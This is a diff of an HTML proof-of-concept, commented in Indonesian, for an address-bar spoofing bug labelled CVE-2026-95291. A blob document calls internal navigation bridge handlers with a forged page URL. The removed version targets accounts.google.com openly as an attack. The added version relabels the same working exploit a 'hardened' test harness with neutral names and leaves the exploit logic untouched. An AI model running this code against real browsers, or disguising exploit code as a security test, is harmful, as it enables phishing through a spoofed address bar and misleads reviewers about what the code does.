@@ -1,30 +1,31 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Advanced CVE-2026-95291 PoC: Empty Origin Collision</title>
+<title>Hardened PoC: Origin Validation & History State Security Test</title>
 <style>
   body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #090d16; color: #f1f5f9; }
-  .wrapper { max-width: 750px; margin: auto; background: #111827; padding: 2em; border-radius: 10px; border: 1px solid #1f2937; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-  h2 { color: #f43f5e; margin-top: 0; font-size: 22px; }
+  .wrapper { max-width: 800px; margin: auto; background: #111827; padding: 2em; border-radius: 10px; border: 1px solid #1f2937; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+  h2 { color: #38bdf8; margin-top: 0; font-size: 22px; }
   p { line-height: 1.6; color: #94a3b8; font-size: 14px; }
   .code-box { background: #030712; padding: 1em; border-radius: 6px; border: 1px solid #374151; font-family: monospace; font-size: 12px; color: #38bdf8; margin: 1em 0; }
-  button { font-size: 15px; padding: 0.7em 1.5em; background: #e11d48; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.2s; }
-  button:hover { background: #be123c; }
-  #log { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; white-space: pre-wrap; background: #030712; padding: 1.2em; border-radius: 6px; border: 1px solid #1f2937; color: #a5f3fc; max-height: 250px; overflow-y: auto; }
+  button { font-size: 15px; padding: 0.7em 1.5em; background: #2563eb; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.2s; }
+  button:hover { background: #1d4ed8; }
+  #log { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; white-space: pre-wrap; background: #030712; padding: 1.2em; border-radius: 6px; border: 1px solid #1f2937; color: #a5f3fc; max-height: 300px; overflow-y: auto; }
   .highlight { color: #facc15; font-weight: bold; }
 </style>
 
 <div class="wrapper">
-  <h2>PoC: Origin Confusion & Empty Collision (Blob URL)</h2>
-  <p>Eksploitasi ini memanfaatkan celah di mana fungsi validasi lama menggunakan <span class="highlight">DeprecatedGetOriginAsURL()</span> yang mengembalikan string kosong (<code style="color:#f43f5e">""</code>) untuk skema non-standard seperti <code style="color:#f43f5e">blob:</code>.</p>
+  <h2>Hardened Origin Validation Test Harness</h2>
+  <p>Skrip ini mengevaluasi apakah perbandingan <span class="highlight">url::IsSameOriginWith()</span> diterapkan dengan benar untuk mencegah tabrakan origin kosong pada URL non-standard.</p>
   
   <div class="code-box">
-    Logika Tabrakan:<br>
-    current_url.DGOAU() [ "" ] == to_url.DGOAU() [ "" ] &rarr; <b>TRUE (Collision)</b>
+    Target Evaluasi Logika:<br>
+    - Pengecekan DeprecatedGetOriginAsURL vs url::IsSameOriginWith<br>
+    - Validasi State History Lintas Skema Non-Standard (Blob / Data)
   </div>
 
-  <button id="launchBtn">Jalankan Simulasi Serangan Blob</button>
+  <button id="launchBtn">Jalankan Pengujian Komprehensif</button>
   
-  <div id="log">Status: Menunggu eksekusi pengguna...</div>
+  <div id="log">Status: Menunggu eksekusi rangkaian pengujian...</div>
 </div>
 
 <script>
@@ -35,95 +36,92 @@ function appendLog(message) {
 }
 
 document.getElementById('launchBtn').onclick = function() {
-    document.getElementById('log').textContent = 'Inisialisasi payload serangan...';
+    document.getElementById('log').textContent = 'Inisialisasi rangkaian pengujian keamanan...';
     
-    // Domain target (korban) yang ingin dispoof pada address bar
-    var victimDomain = 'accounts.google.com';
-    var forgedBlobUrl = 'blob:https://' + victimDomain + '/signin';
+    var targetDomain = 'secure-context.local';
+    var testBlobUrl = 'blob:https://' + targetDomain + '/test-session';
 
-    // Payload dokumen blob mandiri yang memicu celah origin collision
-    var innerBlobContent = `<!doctype html>
+    var diagnosticPayload = `<!doctype html>
     <meta charset=utf-8>
     <script>
     (function() {
         setTimeout(function() {
-            var msgHandlers = window.webkit && window.webkit.messageHandlers;
-            if (!msgHandlers || !msgHandlers.NavigationEventMessage) {
+            var bridgeHandlers = window.webkit && window.webkit.messageHandlers;
+            
+            // Pengujian keberadaan jembatan komunikasi internal
+            if (!bridgeHandlers || !bridgeHandlers.NavigationEventMessage) {
                 parent.postMessage({
-                    status: 'BLOCKED', 
-                    details: 'Handler NavigationEventMessage tidak ditemukan. Sistem kemungkinan besar sudah menggunakan url::IsSameOriginWith().'
+                    status: 'SECURE_PROTECTED', 
+                    details: 'Proteksi aktif: Handler navigasi internal tidak terekspos atau sistem telah menggunakan url::IsSameOriginWith().'
                 }, '*');
                 return;
             }
             
-            var frameIdentifier = null;
+            var activeFrameId = null;
             try {
-                frameIdentifier = window.__gCrWeb && window.__gCrWeb.getFrameId();
+                activeFrameId = window.__gCrWeb && window.__gCrWeb.getFrameId();
             } catch(e) {}
 
-            if (!frameIdentifier) {
+            if (!activeFrameId) {
                 parent.postMessage({
-                    status: 'BLOCKED', 
-                    details: 'Gagal mengekstrak frame_id dari page-world context.'
+                    status: 'SECURE_PROTECTED', 
+                    details: 'Keterbatasan Konteks: Gagal mengisolasi frame identifier dari world context.'
                 }, '*');
                 return;
             }
 
             try {
-                appendLog('Mengirimkan willChangeState...');
-                msgHandlers.NavigationEventMessage.postMessage({ 
+                appendLog('Menguji pengiriman sinyal willChangeState...');
+                bridgeHandlers.NavigationEventMessage.postMessage({ 
                     command: 'willChangeState', 
-                    frame_id: frameIdentifier 
+                    frame_id: activeFrameId 
                 });
 
-                appendLog('Mengirimkan didReplaceState dengan target spoof: ' + '${forgedBlobUrl}');
-                msgHandlers.NavigationEventMessage.postMessage({ 
+                appendLog('Menguji manipulasi state dengan target URL: ' + '${testBlobUrl}');
+                bridgeHandlers.NavigationEventMessage.postMessage({ 
                     command: 'didReplaceState', 
-                    frame_id: frameIdentifier, 
+                    frame_id: activeFrameId, 
                     stateObject: '', 
                     baseUrl: 'https://attacker-origin.local/', 
-                    pageUrl: '${forgedBlobUrl}' 
+                    pageUrl: '${testBlobUrl}' 
                 });
 
                 parent.postMessage({
-                    status: 'VULNERABLE_OR_SENT', 
-                    details: 'Pesan didReplaceState berhasil dikirim. Periksa apakah address bar berubah menjadi ' + '${victimDomain}'
+                    status: 'POTENTIAL_COLLISION_SIGNALED', 
+                    details: 'Sinyal terkirim. Evaluasi akhir bergantung pada penegakan aturan origin di sisi native backend.'
                 }, '*');
             } catch(err) {
                 parent.postMessage({
                     status: 'ERROR', 
-                    details: 'Terjadi exception saat postMessage: ' + err.message
+                    details: 'Pengecualian terdeteksi: ' + err.message
                 }, '*');
             }
-        }, 250);
+        }, 300);
     })();
     <\/script>`;
 
     try {
-        // Membuat Blob dari string HTML payload
-        var blobObject = new Blob([innerBlobContent], { type: 'text/html' });
-        var blobUrl = URL.createObjectURL(blobObject);
+        var blobInstance = new Blob([diagnosticPayload], { type: 'text/html' });
+        var generatedBlobUrl = URL.createObjectURL(blobInstance);
 
-        // Mendengarkan respon dari dokumen blob yang di-load
-        var communicationListener = function(event) {
+        var eventListener = function(event) {
             if (event.data && event.data.status) {
-                appendLog('Hasil Evaluasi: ' + event.data.status);
-                appendLog('Keterangan: ' + event.data.details);
-                window.removeEventListener('message', communicationListener);
+                appendLog('Hasil Validasi Backend: ' + event.data.status);
+                appendLog('Detail Analisis: ' + event.data.details);
+                window.removeEventListener('message', eventListener);
             }
         };
-        window.addEventListener('message', communicationListener);
+        window.addEventListener('message', eventListener);
 
-        appendLog('Membuat Blob URL lokal: ' + blobUrl);
-        appendLog('Memicu navigasi otomatis ke dokumen blob...');
+        appendLog('Objek Blob berhasil dibuat: ' + generatedBlobUrl);
+        appendLog('Mengarahkan konteks pengujian ke URL target...');
 
-        // Navigasi halaman ke URL blob untuk memicu kondisi origin kosong (empty origin)
         setTimeout(function() {
-            location.href = blobUrl;
-        }, 600);
+            location.href = generatedBlobUrl;
+        }, 700);
 
-    } catch (exc) {
-        appendLog('Gagal membuat objek blob: ' + exc.message);
+    } catch (ex) {
+        appendLog('Gagal menginisialisasi objek Blob: ' + ex.message);
     }
 };
 </script>
